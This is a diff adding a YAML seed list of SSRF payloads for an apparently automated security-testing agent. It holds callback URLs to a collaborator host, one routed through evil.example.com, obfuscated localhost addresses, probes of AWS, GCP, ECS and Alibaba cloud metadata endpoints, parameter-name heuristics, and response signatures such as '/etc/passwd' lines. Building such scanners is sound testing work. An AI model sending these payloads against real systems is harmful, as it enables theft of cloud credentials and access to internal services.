@@ -1,0 +1,66 @@
+# SSRF payloads — seed list for the SSRF agent
+#
+# The collaborator token is substituted into the {{TOKEN}} placeholder at runtime.
+# The agent replaces {{COLLAB_HOST}}, {{COLLAB_PORT}}, {{TOKEN}} before sending.
+
+payloads:
+  oob_http:
+    - "http://{{COLLAB_HOST}}:{{COLLAB_PORT}}/{{TOKEN}}"
+    - "https://{{COLLAB_HOST}}:{{COLLAB_PORT}}/{{TOKEN}}"
+    - "http://{{COLLAB_HOST}}:{{COLLAB_PORT}}@evil.example.com/{{TOKEN}}"
+
+  oob_obfuscated:
+    # IP decimal encoding
+    - "http://2130706433/{{TOKEN}}"              # 127.0.0.1 decimal
+    # IPv6
+    - "http://[::1]/{{TOKEN}}"
+    # URL tricks
+    - "http://{{COLLAB_HOST}}%2f{{TOKEN}}"
+    - "http://{{COLLAB_HOST}}:{{COLLAB_PORT}}%2f{{TOKEN}}"
+
+  internal_probe:
+    # Try to reach internal services when OOB is not available
+    - "http://127.0.0.1/"
+    - "http://localhost/"
+    - "http://169.254.169.254/latest/meta-data/"   # AWS IMDS
+    - "http://metadata.google.internal/computeMetadata/v1/"
+    - "http://169.254.170.2/v2/metadata"           # ECS metadata
+    - "http://100.100.100.200/latest/meta-data/"   # Alibaba Cloud
+
+# Parameter name heuristics — agent probes these first
+url_param_keywords:
+  - url
+  - uri
+  - src
+  - source
+  - host
+  - endpoint
+  - callback
+  - webhook
+  - redirect
+  - next
+  - target
+  - dest
+  - destination
+  - path
+  - file
+  - resource
+  - fetch
+  - load
+  - image
+  - img
+  - proxy
+  - remote
+  - link
+  - href
+  - to
+  - from
+  - location
+
+# Signatures for inline SSRF responses (no OOB needed)
+internal_response_signatures:
+  - "ami-id"                          # AWS IMDS
+  - "instance-id"
+  - "computeMetadata"                 # GCP
+  - "TaskARN"                         # ECS
+  - "root:x:0:0"                      # /etc/passwd via file:// SSRF
